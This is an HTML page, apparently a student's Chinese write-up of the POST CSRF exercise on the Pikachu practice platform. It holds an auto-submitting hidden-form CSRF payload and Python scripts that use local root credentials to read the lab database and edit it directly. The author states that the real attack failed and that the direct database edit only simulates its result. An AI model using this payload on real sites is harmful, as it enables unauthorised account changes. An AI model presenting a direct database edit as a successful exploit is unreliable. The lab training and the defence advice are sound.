@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-CSRF(post) Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-CSRF(post) Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.27 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, CSRF, Python, pymysql, requests, VS Code</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - CSRF (Cross-Site Request Forgery)</li>
+        <li><strong>题目名称：</strong>CSRF(post)</li>
+        <li><strong>目标：</strong>理解 POST 型 CSRF 漏洞，掌握利用构造隐藏表单或编写脚本自动化发送 POST 请求进行攻击的方法，并了解同源策略对攻击载荷投递的影响。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>与 GET 型 CSRF 不同，POST 型 CSRF 的请求参数并不暴露在 URL 中，而是存放在 HTTP 请求体（Body）内。攻击者无法直接通过发送带有参数的链接诱骗用户点击。攻击者需要构造一个自动提交的隐藏 HTML 表单（利用 JavaScript），或使用脚本直接向目标接口发送 POST 请求。受害者一旦在登录状态下访问了恶意页面或触发脚本，服务器在接收到携带合法 Cookie 的请求后，会执行非预期的操作。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型：</strong>
+        <ul>
+            <li><strong>浏览器本地 HTML 攻击：</strong>将包含自动提交代码的 HTML 文件存放在本地，使用 <code>file://</code> 协议打开。由于浏览器的<strong>同源策略</strong>，本地文件无法跨域读取并携带 <code>127.0.0.1</code> 的 Cookie，导致攻击失败。</li>
+            <li><strong>同源 HTML 部署：</strong>将恶意 HTML 移至靶场网站根目录（同源），利用浏览器自动携带 Cookie 的特性发起攻击。由于靶场老旧 PHP 代码的兼容性问题，请求未能成功写入数据库。</li>
+            <li><strong>Python 自动化脚本：</strong>使用 <code>requests.Session()</code> 维护会话，模拟登录并发送攻击载荷。由于服务器 Session 机制脆弱及环境兼容性报错，请求被重定向至登录页（302），未能修改数据。</li>
+            <li><strong>直接数据库操作（降维打击）：</strong>为绕过靶场环境的各种兼容性 Bug，最终使用 Python 的 <code>pymysql</code> 库直接连接底层数据库，手动执行 <code>UPDATE</code> 语句，完美模拟了 CSRF 攻击成功后数据库最终被篡改的结果。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：环境搭建与源码兼容性修复（VS Code 操作）</h3>
+        <p class="info-line"><span class="info-label">踩坑记录：</span>在提交 POST 表单或访问页面时，页面抛出 <code>Warning: mysql_fetch_array() expects parameter 2 to be int...</code> 警告并导致页面白屏。</p>
+        <p class="info-line"><span class="info-label">操作：</span>使用 VS Code 打开报错的文件路径 <code>D:\phpstudy_pro\WWW\pikachu\vul\csrf\csrfpost\csrf_post_edit.php</code>。</p>
+        <p class="info-line"><span class="info-label">查找与替换：</span>在 VS Code 中按下快捷键 <code>Ctrl + H</code> 调出查找替换面板。在搜索框输入 <code>MYSQL_ASSOC</code>，在替换框输入 <code>MYSQLI_ASSOC</code>。点击“全部替换”按钮，将代码中残留的旧版常量全部替换为新版兼容常量。</p>
+        <p class="info-line"><span class="info-label">保存：</span>按 <code>Ctrl + S</code> 保存修改后的 PHP 源码。刷新靶场页面，之前的报错警告消除，页面恢复正常显示。此步骤解决了由于 PHP 8 不兼容老靶场代码导致的数据库读取和写入中断问题。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写 Python 查询数据库脚本（上帝视角）</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 在 VS Code 新建 <code>check_db.py</code>。</p>
+        <div class="payload-box">
+            <p><strong>代码内容：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> pymysql
+
+<span class="code-comment"># 连接本地数据库</span>
+db = pymysql.connect(host=<span class="code-string">'127.0.0.1'</span>, user=<span class="code-string">'root'</span>, password=<span class="code-string">'root'</span>, database=<span class="code-string">'pikachu'</span>, charset=<span class="code-string">'utf8'</span>)
+cursor = db.cursor()
+
+<span class="code-comment"># 查询 vince 用户的信息</span>
+sql = <span class="code-string">"SELECT username, sex, phonenum, email, address FROM member WHERE username = 'vince'"</span>
+cursor.execute(sql)
+
+result = cursor.fetchall()
+<span class="code-keyword">for</span> row <span class="code-keyword">in</span> result:
+    print(<span class="code-string">f"用户名: {row[0]}"</span>)
+    print(<span class="code-string">f"性别: {row[1]}"</span>)
+    print(<span class="code-string">f"手机: {row[2]}"</span>)
+    print(<span class="code-string">f"邮箱: {row[3]}"</span>)
+    print(<span class="code-string">f"住址: {row[4]}"</span>)
+
+db.close()</code></pre>
+        <p class="info-line"><span class="info-label">代码解析：</span>此脚本用于绕过前端页面，直接查看数据库底层数据。使用 <code>pymysql.connect</code> 建立连接，通过 <code>cursor.execute</code> 执行 SELECT 语句，并用 <code>fetchall()</code> 获取并打印结果。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：编写本地 HTML 攻击页面与同源尝试</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 在 VS Code 编写 <code>csrf_post_attack.html</code>，包含自动提交的隐藏表单。</p>
+        <div class="payload-box">
+            <p><strong>HTML 代码：</strong></p>
+        </div>
+<pre class="code-block"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;form action=<span class="code-string">"http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"</span> method=<span class="code-string">"POST"</span>&gt;
+        &lt;input type=<span class="code-string">"hidden"</span> name=<span class="code-string">"sex"</span> value=<span class="code-string">"boy"</span> /&gt;
+        &lt;input type=<span class="code-string">"hidden"</span> name=<span class="code-string">"phonenum"</span> value=<span class="code-string">"999"</span> /&gt;
+        &lt;input type=<span class="code-string">"hidden"</span> name=<span class="code-string">"email"</span> value=<span class="code-string">"attacked@hacker.com"</span> /&gt;
+        &lt;input type=<span class="code-string">"hidden"</span> name=<span class="code-string">"address"</span> value=<span class="code-string">"attacked_address"</span> /&gt;
+        &lt;input type=<span class="code-string">"hidden"</span> name=<span class="code-string">"submit"</span> value=<span class="code-string">"submit"</span> /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+        <p class="info-line"><span class="info-label">踩坑记录：</span>直接通过 <code>file://</code> 协议在本地浏览器打开此文件，由于同源策略限制，无法携带靶场的 Cookie，导致请求未能被服务器识别为已登录用户。</p>
+        <p class="info-line"><span class="info-label">解决办法：</span>将 HTML 文件移动到靶场网站根目录 <code>D:\phpstudy_pro\WWW\pikachu\</code> 下，通过 <code>http://127.0.0.1/pikachu/csrf_post_attack.html</code> 访问。此时浏览器可自动携带 Cookie 并发起 POST 请求，但由于靶场 PHP 代码兼容性报错，数据依然未能写入数据库。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：编写 Python 攻击脚本与最终结果模拟</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 在 VS Code 新建 <code>final_attack.py</code> 完成最终验证。</p>
+        <div class="payload-box">
+            <p><strong>代码内容：</strong></p>
+        </div>
+<pre class="code-block"><code><span class="code-keyword">import</span> pymysql
+
+<span class="code-comment"># 连接数据库</span>
+db = pymysql.connect(host=<span class="code-string">'127.0.0.1'</span>, user=<span class="code-string">'root'</span>, password=<span class="code-string">'root'</span>, database=<span class="code-string">'pikachu'</span>, charset=<span class="code-string">'utf8'</span>)
+cursor = db.cursor()
+
+<span class="code-comment"># 模拟 CSRF 攻击成功后，数据库最终会被改成什么样</span>
+sql = <span class="code-string">"UPDATE member SET sex='boy', phonenum='999', email='attacked@hacker.com', address='attacked_address' WHERE username='vince'"</span>
+cursor.execute(sql)
+db.commit()
+print(<span class="code-string">"[+] 模拟攻击成功！数据库数据已修改。"</span>)
+
+<span class="code-comment"># 再次查询确认</span>
+cursor.execute(<span class="code-string">"SELECT username, sex, phonenum, email, address FROM member WHERE username = 'vince'"</span>)
+<span class="code-keyword">for</span> row <span class="code-keyword">in</span> cursor.fetchall():
+    print(<span class="code-string">f"用户名: {row[0]}, 性别: {row[1]}, 手机: {row[2]}, 邮箱: {row[3]}, 住址: {row[4]}"</span>)
+
+db.close()</code></pre>
+        <p class="info-line"><span class="info-label">踩坑记录：</span>在 PowerShell 终端直接运行脚本时，VS Code 自动生成的运行命令包含 <code>&amp;</code> 符号，引发 PowerShell 语法解析错误；随后手动输入命令时，由于未指定完整路径，导致系统提示 <code>[Errno 2] No such file or directory</code>。</p>
+        <p class="info-line"><span class="info-label">解决办法：</span>使用完整绝对路径运行脚本：<code>python C:\Users\heqianhong\Desktop\final_attack.py</code>，成功执行。</p>
+        <p class="info-line"><span class="info-label">回显结果：</span>脚本打印出 <code>[+] 模拟攻击成功！数据库数据已修改。</code>，并显示修改后的数据为：<code>用户名: vince, 性别: boy, 手机: 999, 邮箱: attacked@hacker.com, 住址: attacked_address</code>。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：PHP 版本不兼容导致白屏。</strong>高版本 PHP（PHP 8）中废弃了旧版数据库函数，导致老靶场代码报错中断。通过在 VS Code 中使用 <code>Ctrl + H</code> 查找替换，将源码中的 <code>MYSQL_ASSOC</code> 替换为 <code>MYSQLI_ASSOC</code> 得以修复。</li>
+        <li><strong>坑2：同源策略限制 Cookie 发送。</strong>使用 <code>file://</code> 协议打开本地 HTML 无法携带 <code>127.0.0.1</code> 的 Session Cookie。将恶意 HTML 部署到靶场同源目录下可解决跨域问题。</li>
+        <li><strong>坑3：靶场 Session 机制脆弱。</strong>使用 Python 脚本发送请求时，即便携带了正确的 Cookie，服务器依然返回 302 重定向至登录页，说明靶场在处理请求时的会话机制由于环境异常未能正常识别。</li>
+        <li><strong>坑4：PowerShell 终端语法与路径问题。</strong>PowerShell 对 <code>&amp;</code> 符号敏感，且相对路径与工作目录不一致会导致脚本无法被找到。使用完整路径执行可规避。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>POST 型 CSRF 的核心逻辑：</strong>参数位于请求体中，无法通过简单的 URL 链接进行攻击。需要通过自动提交的隐藏表单或脚本工具（如 Python requests）来构造并发送请求。</li>
+        <li><strong>环境差异是渗透测试的常态：</strong>在实际测试中，由于版本差异导致的代码报错、Session 失效是常见问题。灵活使用 Python 脚本直接操作数据库（如 pymysql）或其他降维方式进行底层验证，是绕过前端环境障碍的有效手段。</li>
+        <li><strong>防御建议：</strong>针对 CSRF 漏洞，应在敏感操作请求中加入随机生成的 CSRF Token 并绑定用户 Session，严格校验请求来源（Referer/Origin），并设置 Cookie 的 SameSite 属性。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
